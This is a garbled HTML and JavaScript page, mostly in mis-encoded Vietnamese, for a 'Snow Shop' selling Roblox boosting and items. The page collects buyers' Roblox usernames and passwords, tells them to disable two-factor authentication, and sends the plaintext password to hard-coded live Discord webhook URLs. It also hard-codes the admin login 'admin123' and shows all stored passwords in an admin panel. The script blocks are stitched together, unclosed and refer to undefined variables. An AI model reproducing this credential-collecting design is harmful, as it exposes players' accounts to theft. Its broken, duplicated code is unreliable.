<!doctype html>
<html lang="vi">
<head>
    <meta charset="utf-8">
    <title>â„ï¸ SNOW SHOP â€” Professional System</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>
        body{font-family:'Segoe UI',Tahoma,sans-serif;background:#f1f5f9;margin:0;padding-bottom:50px;color:#334155}
        .box{background:#fff;margin:12px;border-radius:12px;padding:14px;box-shadow:0 6px 16px rgba(0,0,0,.06)}
        button{background:#38bdf8;border:0;padding:10px 14px;border-radius:10px;font-weight:bold;margin:6px 0;cursor:pointer;transition:0.18s;color:#fff}
        button:hover{opacity:0.9;transform:translateY(-1px)}
        button.red{background:#ef4444} button.green{background:#22c55e} button.purple{background:#a855f7}
        input,select,textarea{width:100%;padding:12px;margin:6px 0;border-radius:8px;border:1px solid #e2e8f0;box-sizing:border-box;font-size:14px}
        .info{background:#f0f9ff;border:1px dashed #38bdf8;border-radius:10px;padding:12px;margin-top:10px;font-size:13px}
        .badge{padding:4px 8px;border-radius:6px;font-size:11px;font-weight:bold}
        .bg-wait{background:#fef3c7;color:#d97706} .bg-done{background:#dcfce7;color:#16a34a} .bg-process{background:#f3e8ff;color:#7c3aed}
        .tab-btn{background:#fff;color:#64748b;border:1px solid #e2e8f0;margin-right:5px}
        .tab-btn.active{background:#38bdf8;color:#fff;border-color:#38bdf8}
        #modalOverlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(15,23,42,0.6);display:none;z-index:1000;backdrop-filter:blur(3px)}
        .modal{background:#fff;width:90%;max-width:400px;margin:80px auto;border-radius:16px;padding:20px;position:relative;animation:slideUp 0.3s}
        @keyframes slideUp{from{transform:translateY(20px);opacity:0} to{transform:translateY(0);opacity:1}}
        optgroup{font-weight:bold;color:#0f172a}

        /* CSS BONG BÃ“NG Há»– TRá»¢ */
        .support-btn { position: fixed; bottom: 20px; right: 20px; width: 60px; height: 60px; background: #0ea5e9; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-size: 30px; box-shadow: 0 4px 15px rgba(14, 165, 233, 0.4); cursor: pointer; z-index: 999; animation: pulse 2s infinite; }
        .support-menu { position: fixed; bottom: 90px; right: 20px; display: none; flex-direction: column; gap: 10px; z-index: 999; }
        .support-item { background: white; padding: 10px 15px; border-radius: 30px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); display: flex; align-items: center; gap: 10px; text-decoration: none; color: #334155; font-weight: bold; font-size: 14px; transition: 0.2s; border: 1px solid #e2e8f0; }
        .support-item:hover { transform: translateX(-5px); background: #f8fafc; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
    </style>
</head>
<body>

<div class="box" style="display:flex; justify-content:space-between; align-items:center; background:linear-gradient(to right, #ffffff, #f0f9ff)">
    <div>
        <div style="font-size:12px; color:#64748b">TÃ i khoáº£n: <b id="uName" style="color:#0f172a">KhÃ¡ch</b></div>
        <div style="font-size:18px; font-weight:bold; color:#16a34a">ğŸ’° <span id="uBalance">0</span> Ä‘</div>
    </div>
    <div id="authButtons"><button onclick="showLogin()">ğŸ”‘ ÄÄƒng nháº­p</button></div>
    <div id="userButtons" style="display:none"><button onclick="logout()" class="red">ThoÃ¡t</button></div>
</div>

<div id="clientView">
    <div class="box">
        <h3 style="margin:0 0 10px 0; color:#0f172a">ğŸ›’ Chá»n gÃ³i dá»‹ch vá»¥</h3>
        <select id="goi">
            <option value="">-- Click Ä‘á»ƒ chá»n gÃ³i --</option>
            <optgroup label="ğŸ”° LEVEL">
                <option value="Level 700|20000">Level 700 â€“ 20.000Ä‘</option>
                <option value="700 â†’ 1500|20000">700 â†’ 1500 â€“ 20.000Ä‘</option>
                <option value="1500 â†’ 2800|20000">1500 â†’ 2800 â€“ 20.000Ä‘</option>
                <option value="0 â†’ MAX|50000">0 â†’ MAX â€“ 50.000Ä‘</option>
            </optgroup>
            <optgroup label="ğŸ’ ITEM">
                <option value="Má» Neo|20000">Má» Neo â€“ 20.000Ä‘</option>
                <option value="Tushita|15000">Tushita â€“ 15.000Ä‘</option>
                <option value="Yama|30000">Yama â€“ 30.000Ä‘</option>
                <option value="Tam Kiáº¿m Full|35000">Tam Kiáº¿m Full â€“ 35.000Ä‘</option>
                <option value="CDK|30000">CDK â€“ 30.000Ä‘</option>
            </optgroup>
            <optgroup label="ğŸ’  V4">
                <option value="Full Gear V4|30000">Full Gear V4 â€“ 30.000Ä‘</option>
                <option value="1 Gear V4|5000">1 Gear V4 â€“ 5.000Ä‘</option>
            </optgroup>
            <optgroup label="ğŸ¥‹ MELEE">
                <option value="Godhuman|20000">Godhuman â€“ 20.000Ä‘</option>
                <option value="Melee V2|15000">Melee V2 â€“ 15.000Ä‘</option>
            </optgroup>
        </select>
        <input id="accRoblox" placeholder="Username / Email Roblox">
        <input id="passRoblox" type="password" placeholder="Password Roblox">
        <div class="info">âš ï¸ HÃ£y táº¯t xÃ¡c minh 2 bÆ°á»›c (2FA) trÆ°á»›c khi Ä‘áº·t Ä‘Æ¡n.</div>
        <button class="green" style="width:100%; font-size:16px" onclick="handleBuy()">XÃC NHáº¬N MUA NGAY</button>
        <button class="purple" style="width:100%" onclick="showNapBank()">ğŸ’³ Náº P TIá»€N QUA BANK / MOMO</button>
    </div>

    <div class="box">
        <h3 style="margin:0 0 10px 0">ğŸ“œ Lá»‹ch sá»­ giao dá»‹ch</h3>
        <div id="historyList">Vui lÃ²ng Ä‘Äƒng nháº­p...</div>
    </div>
</div>

<div id="adminView" style="display:none">
    <div class="box" style="border: 2px solid #ef4444; background:#fff5f5">
        <h2 style="color:#ef4444; margin-top:0">ğŸ›  ADMIN PANEL</h2>
        <div style="display:flex; overflow-x:auto; padding-bottom:5px">
            <button class="tab-btn active" onclick="showTab('orders', this)">Quáº£n lÃ½ Ä‘Æ¡n</button>
            <button class="tab-btn" onclick="showTab('naps', this)">Duyá»‡t Náº¡p</button>
            <button class="tab-btn" onclick="showTab('users', this)">Cáº¥p Tiá»n</button>
            <button class="tab-btn" onclick="showTab('usersList', this)">ThÃ nh viÃªn</button>
        </div>
        <div id="tabOrders" class="tab-content"><div id="adminOrderList"></div></div>
        <div id="tabNaps" class="tab-content" style="display:none"><div id="adminNapList"></div></div>
        <div id="tabUsers" class="tab-content" style="display:none">
            <h4>Cáº¥p tiá»n cho tÃ i khoáº£n</h4>
            <input id="adTargetUser" placeholder="TÃªn tÃ i khoáº£n nháº­n tiá»n">
            <input id="adAmount" type="number" placeholder="Sá»‘ tiá»n (VÃ­ dá»¥: 50000)">
            <button class="green" style="width:100%" onclick="adminAddMoney()">Cáº¤P TIá»€N NGAY</button>
        </div>
        <div id="tabUsersList" class="tab-content" style="display:none">
            <h4>Danh sÃ¡ch thÃ nh viÃªn</h4>
            <div id="adminMemberList"></div>
        </div>
    </div>
</div>

<div class="support-menu" id="supportMenu">
    <a href="https://www.facebook.com/share/1Dkb4j9v3Q/">ğŸ”µ Messenger Admin</a>
    <a href="0373727384" class="support-item">ğŸŸ¢ Chat Zalo</a>
    <a href="https://www.facebook.com/share/1Dkb4j9v3Q/" target="_blank" class="support-item">ğŸ“˜ Facebook CÃ¡ NhÃ¢n</a>
</div>
<div class="support-btn" onclick="toggleSupport()">ğŸ’¬</div>

<div id="modalOverlay"><div class="modal" id="modalContent"></div></div>

<script>
// --- GIá»® NGUYÃŠN TOÃ€N Bá»˜ LOGIC JAVASCRIPT CÅ¨ Cá»¦A Báº N ---
const ADMIN_CONFIG = { user: "admin", pass: "admin123" };
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1465766093543964673/QfBdKIbYOgo5_s9S_YaJDF6vg6ZF8RyWwEw06uPZW3YtZuPUjCmODVJfdFmowfH1d9Gm";

let cur = null;
let db_users = JSON.parse(localStorage.getItem('snow_users') || '{}');
let db_orders = JSON.parse(localStorage.getItem('snow_orders') || '[]');
let db_naps = JSON.parse(localStorage.getItem('snow_naps') || '[]');

const el = {
    uName: document.getElementById('uName'),
    uBalance: document.getElementById('uBalance'),
    authBtns: document.getElementById('authButtons'),
    userBtns: document.getElementById('userButtons'),
    history: document.getElementById('historyList'),
    modal: document.getElementById('modalOverlay'),
    modalIn: document.getElementById('modalContent'),
    adminView: document.getElementById('adminView')
};
async function sendDiscord(webhook, payload) {
    try {
        await fetch(webhook, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        console.error("Webhook error:", e);
    }
}

// HÃ m má»Ÿ/Ä‘Ã³ng bong bÃ³ng
function toggleSupport() {
    const menu = document.getElementById('supportMenu');
    menu.style.display = (menu.style.display === 'flex') ? 'none' : 'flex';
}

window.onload = () => {
    const session = localStorage.getItem('snow_session');
    if(session && db_users[session]) cur = db_users[session];
    render();
};

function render() {
    if(!cur) {
        el.uName.innerText = "KhÃ¡ch"; el.uBalance.innerText = "0";
        el.authBtns.style.display = "block"; el.userBtns.style.display = "none";
        el.adminView.style.display = "none";
        el.history.innerHTML = "<center>ÄÄƒng nháº­p Ä‘á»ƒ xem Ä‘Æ¡n</center>";
    } else {
        cur = db_users[cur.username];
        el.uName.innerText = cur.username;
        el.uBalance.innerText = cur.balance.toLocaleString();
        el.authBtns.style.display = "none"; el.userBtns.style.display = "block";
        el.adminView.style.display = (cur.username === ADMIN_CONFIG.user) ? "block" : "none";
        const myOrders = db_orders.filter(o => o.buyer === cur.username);
        el.history.innerHTML = myOrders.length ? myOrders.map(o => `
            <div style="border-bottom:1px solid #f1f5f9; padding:10px 0">
                <div style="display:flex; justify-content:space-between">
                    <b>${o.goi}</b>
                    <span class="badge ${o.status==='Xong'?'bg-done':(o.status==='Äang cÃ y'?'bg-process':'bg-wait')}">${o.status}</span>
                </div>
                <small style="color:#94a3b8">${o.time}</small>
            </div>
        `).reverse().join('') : "ChÆ°a cÃ³ Ä‘Æ¡n hÃ ng nÃ o.";
        if(cur.username === ADMIN_CONFIG.user) renderAdmin();
    }
}

function renderAdmin() {
    document.getElementById('adminOrderList').innerHTML = db_orders.map((o, i) => `
        <div class="box" style="background:#f8fafc; border-left:4px solid #38bdf8">
            <b>${o.buyer}</b> - ${o.goi}<br>
            TK: <code>${o.acc}</code> | MK: <code>${o.pass}</code><br>
            <button onclick="updateStatus(${i}, 'Äang cÃ y')" class="purple" style="font-size:11px">CÃ y</button>
            <button onclick="updateStatus(${i}, 'Xong')" class="green" style="font-size:11px">Xong</button>
            <button onclick="deleteOrder(${i})" class="red" style="font-size:11px">XoÃ¡</button>
        </div>
    `).reverse().join('');
    document.getElementById('adminNapList').innerHTML = db_naps.map((n, i) => `
        <div class="box" style="background:#f8fafc">
            <b>${n.username}</b> - náº¡p ${n.amount.toLocaleString()}Ä‘<br>
            Tráº¡ng thÃ¡i: <b>${n.status}</b><br>
            ${n.status === 'Chá» duyá»‡t' ? `<button onclick="approveNap(${i})" class="green">Duyá»‡t náº¡p</button>` : ''}
            <button onclick="deleteNap(${i})" class="red">XoÃ¡</button>
        </div>
    `).reverse().join('');
    document.getElementById('adminMemberList').innerHTML = Object.values(db_users).map(user => `
        <div class="box" style="background:#f8fafc; border:1px solid #e2e8f0; margin:5px 0">
            <b>User:</b> ${user.username} | <b>Pass:</b> ${user.password}<br>
            <b>Sá»‘ dÆ°:</b> <span style="color:#16a34a">${user.balance.toLocaleString()}Ä‘</span>
        </div>
    `).reverse().join('');
}

function handleBuy() {
    if (!cur) return alert("Vui lÃ²ng Ä‘Äƒng nháº­p Ä‘á»ƒ mua hÃ ng!");

    const goiSelect = document.getElementById('goi').value;
    const acc = document.getElementById('accRoblox').value.trim();
    const pass = document.getElementById('passRoblox').value.trim();

    if (!goiSelect || !acc || !pass) return alert("Vui lÃ²ng nháº­p Ä‘áº§y Ä‘á»§ thÃ´ng tin!");

    const [name, price] = goiSelect.split('|');
    const total = parseInt(price);

    if (cur.balance < total) return alert("Sá»‘ dÆ° khÃ´ng Ä‘á»§! Vui lÃ²ng náº¡p thÃªm.");

    // Trá»« tiá»n vÃ  lÆ°u Ä‘Æ¡n hÃ ng
    db_users[cur.username].balance -= total;
    const newOrder = {
        buyer: cur.username,
        goi: name,
        acc: acc,
        pass: pass,
        status: "Chá» duyá»‡t",
        time: new Date().toLocaleString()
    };
    db_orders.push(newOrder);
    save();
    render();
    alert("Äáº·t Ä‘Æ¡n thÃ nh cÃ´ng!");

    // Gá»­i thÃ´ng bÃ¡o Discord
    sendDiscord(WEBHOOK_ORDER, {
        content: `ğŸš¨ **CÃ“ ÄÆ N CÃ€Y THUÃŠ Má»šI!** (Admin: ${ADMIN_ROLE_ID})`,
        embeds: [{
            title: "â„ï¸ ÄÆ N THUÃŠ Má»šI â€” SNOW SHOP",
            color: 0x38bdf8,
            fields: [
                { name: "ğŸ‘¤ KhÃ¡ch hÃ ng", value: `\`${cur.username}\``, inline: true },
                { name: "ğŸ“¦ GÃ³i dá»‹ch vá»¥", value: `\`${name}\``, inline: true },
                { name: "ğŸ’° GiÃ¡", value: `\`${total.toLocaleString()}Ä‘\``, inline: true },
                { name: "ğŸ® TÃ i khoáº£n Roblox", value: `\`${acc}\`` },
                { name: "ğŸ”‘ Máº­t kháº©u", value: `\`${pass}\`` }
            ],
            footer: { text: "SNOW SHOP â€¢ System" },
            timestamp: new Date()
        }]
    });
} // <-- Quan trá»ng: Pháº£i cÃ³ dáº¥u Ä‘Ã³ng ngoáº·c nÃ y

function approveNap(i) {
    sendDiscord(WEBHOOK_NAP, {
    embeds: [{
        title: "âœ… DUYá»†T Náº P THÃ€NH CÃ”NG",
        color: 0x22c55e,
        fields: [
            { name: "ğŸ‘¤ User", value: `\`${req.username}\`` },
            { name: "ğŸ’µ Sá»‘ tiá»n", value: `\`${req.amount.toLocaleString()}Ä‘\`` },
            { name: "ğŸ›  NgÆ°á»i duyá»‡t", value: "`ADMIN`" }
        ],
        footer: { text: "SNOW SHOP â€¢ Admin Action" },
        timestamp: new Date()
    }]

function showNapBank() {
    openModal(`
        <h3>ğŸ’³ Náº¡p tiá»n</h3>
        <div class="info" style="text-align:center">Ná»™i dung chuyá»ƒn khoáº£n: <b>NAP ${cur.username}</b></div>
        <input id="napAmt" type="number" placeholder="Nháº­p sá»‘ tiá»n Ä‘Ã£ chuyá»ƒn">
        <button class="green" style="width:100%" onclick="submitNap()">XÃC NHáº¬N ÄÃƒ CHUYá»‚N</button>
    `);
}

function submitNap() {
    sendDiscord(WEBHOOK_NAP, {
    embeds: [{
        title: "ğŸ’° YÃŠU Cáº¦U Náº P TIá»€N",
<script>
const ADMIN_CONFIG = { user: "admin", pass: "admin123" };
// WEBHOOK RIÃŠNG
const WEBHOOK_ORDER = "https://discord.com/api/webhooks/1465766081548390534/iClDUAzau9xqGY3PFZTS6CT24uspMk8w5gLBvKyVyhjcxvuf-SD07-y9f9pC8Vax5lHE";
const WEBHOOK_NAP   = "https://discord.com/api/webhooks/1465766093543964673/QfBdKIbYOgo5_s9S_YaJDF6vg6ZF8RyWwEw06uPZW3YtZuPUjCmODVJfdFmowfH1d9Gm";
const ADMIN_ROLE_ID = "kienmcmc"; 

let cur = null;
let db_users = JSON.parse(localStorage.getItem('snow_users') || '{}');
let db_orders = JSON.parse(localStorage.getItem('snow_orders') || '[]');
let db_naps = JSON.parse(localStorage.getItem('snow_naps') || '[]');

const el = {
    uName: document.getElementById('uName'),
    uBalance: document.getElementById('uBalance'),
    authBtns: document.getElementById('authButtons'),
    userBtns: document.getElementById('userButtons'),
    history: document.getElementById('historyList'),
    modal: document.getElementById('modalOverlay'),
    modalIn: document.getElementById('modalContent'),
    adminView: document.getElementById('adminView')
};

async function sendDiscord(webhook, payload) {
    try {
        await fetch(webhook, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        console.error("Webhook error:", e);
    }
}

function toggleSupport() {
    const menu = document.getElementById('supportMenu');
    menu.style.display = (menu.style.display === 'flex') ? 'none' : 'flex';
}

window.onload = () => {
    const session = localStorage.getItem('snow_session');
    if(session && db_users[session]) cur = db_users[session];
    render();
};

function render() {
    if(!cur) {
        el.uName.innerText = "KhÃ¡ch"; el.uBalance.innerText = "0";
        el.authBtns.style.display = "block"; el.userBtns.style.display = "none";
        el.adminView.style.display = "none";
        el.history.innerHTML = "<center>ÄÄƒng nháº­p Ä‘á»ƒ xem Ä‘Æ¡n</center>";
    } else {
        cur = db_users[cur.username];
        el.uName.innerText = cur.username;
        el.uBalance.innerText = cur.balance.toLocaleString();
        el.authBtns.style.display = "none"; el.userBtns.style.display = "block";
        el.adminView.style.display = (cur.username === ADMIN_CONFIG.user) ? "block" : "none";
        const myOrders = db_orders.filter(o => o.buyer === cur.username);
        el.history.innerHTML = myOrders.length ? myOrders.map(o => `
            <div style="border-bottom:1px solid #f1f5f9; padding:10px 0">
                <div style="display:flex; justify-content:space-between">
                    <b>${o.goi}</b>
                    <span class="badge ${o.status==='Xong'?'bg-done':(o.status==='Äang cÃ y'?'bg-process':'bg-wait')}">${o.status}</span>
                </div>
                <small style="color:#94a3b8">${o.time}</small>
            </div>
        `).reverse().join('') : "ChÆ°a cÃ³ Ä‘Æ¡n hÃ ng nÃ o.";
        if(cur.username === ADMIN_CONFIG.user) renderAdmin();
    }
}

function renderAdmin() {
    document.getElementById('adminOrderList').innerHTML = db_orders.map((o, i) => `
        <div class="box" style="background:#f8fafc; border-left:4px solid #38bdf8">
            <b>${o.buyer}</b> - ${o.goi}<br>
            TK: <code>${o.acc}</code> | MK: <code>${o.pass}</code><br>
            <button onclick="updateStatus(${i}, 'Äang cÃ y')" class="purple" style="font-size:11px">CÃ y</button>
            <button onclick="updateStatus(${i}, 'Xong')" class="green" style="font-size:11px">Xong</button>
            <button onclick="deleteOrder(${i})" class="red" style="font-size:11px">XoÃ¡</button>
        </div>
    `).reverse().join('');
    
    document.getElementById('adminNapList').innerHTML = db_naps.map((n, i) => `
        <div class="box" style="background:#f8fafc">
            <b>${n.username}</b> - náº¡p ${n.amount.toLocaleString()}Ä‘<br>
            Tráº¡ng thÃ¡i: <b>${n.status}</b><br>
            ${n.status === 'Chá» duyá»‡t' ? `<button onclick="approveNap(${i})" class="green">Duyá»‡t náº¡p</button>` : ''}
            <button onclick="deleteNap(${i})" class="red">XoÃ¡</button>
        </div>
    `).reverse().join('');
    
    document.getElementById('adminMemberList').innerHTML = Object.values(db_users).map(user => `
        <div class="box" style="background:#f8fafc; border:1px solid #e2e8f0; margin:5px 0">
            <b>User:</b> ${user.username} | <b>Pass:</b> ${user.password}<br>
            <b>Sá»‘ dÆ°:</b> <span style="color:#16a34a">${user.balance.toLocaleString()}Ä‘</span>
        </div>
<script>
const ADMIN_CONFIG = { user: "admin", pass: "admin123" };

// WEBHOOK
const WEBHOOK_ORDER = "LINK_WEBHOOK_DON";
const WEBHOOK_NAP   = "LINK_WEBHOOK_NAP";
const ADMIN_ROLE_ID = "123456789012345678"; // ID ROLE ADMIN (Sá»)

let cur = null;
let db_users = JSON.parse(localStorage.getItem('snow_users') || '{}');
let db_orders = JSON.parse(localStorage.getItem('snow_orders') || '[]');
let db_naps = JSON.parse(localStorage.getItem('snow_naps') || '[]');

const el = {
  uName: document.getElementById('uName'),
  uBalance: document.getElementById('uBalance'),
  authBtns: document.getElementById('authButtons'),
  userBtns: document.getElementById('userButtons'),
  history: document.getElementById('historyList'),
  modal: document.getElementById('modalOverlay'),
  modalIn: document.getElementById('modalContent'),
  adminView: document.getElementById('adminView')
};

async function sendDiscord(webhook, payload) {
  if(!webhook) return;
  fetch(webhook, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify(payload)
  }).catch(()=>{});
}

window.onload = () => {
  const session = localStorage.getItem('snow_session');
  if(session && db_users[session]) cur = db_users[session];
  render();
};

function render() {
  if(!cur) {
    el.uName.innerText = "KhÃ¡ch";
    el.uBalance.innerText = "0";
    el.authBtns.style.display = "block";
    el.userBtns.style.display = "none";
    el.adminView.style.display = "none";
    el.history.innerHTML = "<center>ÄÄƒng nháº­p Ä‘á»ƒ xem Ä‘Æ¡n</center>";
    return;
  }

  cur = db_users[cur.username];
  el.uName.innerText = cur.username;
  el.uBalance.innerText = cur.balance.toLocaleString();
  el.authBtns.style.display = "none";
  el.userBtns.style.display = "block";
  el.adminView.style.display = cur.username === ADMIN_CONFIG.user ? "block" : "none";

  const myOrders = db_orders.filter(o => o.buyer === cur.username);
  el.history.innerHTML = myOrders.map(o => `
    <div style="border-bottom:1px solid #eee;padding:8px">
      <b>${o.goi}</b> â€” <span>${o.status}</span><br>
      <small>${o.time}</small>
    </div>
  `).reverse().join('') || "ChÆ°a cÃ³ Ä‘Æ¡n";
}

function handleBuy() {
  if(!cur) return alert("Vui lÃ²ng Ä‘Äƒng nháº­p");
  const g = document.getElementById('goi').value;
  const acc = document.getElementById('accRoblox').value.trim();
  const pass = document.getElementById('passRoblox').value.trim();
  if(!g || !acc || !pass) return alert("Nháº­p thiáº¿u!");

  const [name, price] = g.split('|');
  const cost = parseInt(price);
  if(cur.balance < cost) return alert("KhÃ´ng Ä‘á»§ tiá»n!");

  cur.balance -= cost;
  db_orders.push({
    buyer: cur.username,
    goi: name,
    acc, pass,
    status: "Chá» duyá»‡t",
    time: new Date().toLocaleString()
  });

  save(); render(); alert("Äáº·t Ä‘Æ¡n thÃ nh cÃ´ng!");

  sendDiscord(WEBHOOK_ORDER, {
    content: `<@&${ADMIN_ROLE_ID}> ğŸš¨ **CÃ“ ÄÆ N Má»šI**`,
    embeds: [{
      title: "â„ï¸ ÄÆ N CÃ€Y THUÃŠ",
      color: 0x38bdf8,
      fields: [
        {name:"ğŸ‘¤ KhÃ¡ch", value:cur.username, inline:true},
        {name:"ğŸ“¦ GÃ³i", value:name, inline:true},
        {name:"ğŸ® Roblox", value:acc},
        {name:"ğŸ”‘ Máº­t kháº©u", value:"ğŸ”’ Xem trong Admin Panel"}
      ],
      timestamp: new Date()
    }]
  });
}

function save() {
  localStorage.setItem('snow_users', JSON.stringify(db_users));
  localStorage.setItem('snow_orders', JSON.stringify(db_orders));
  localStorage.setItem('snow_naps', JSON.stringify(db_naps));
}
</script>
</body>
</html>
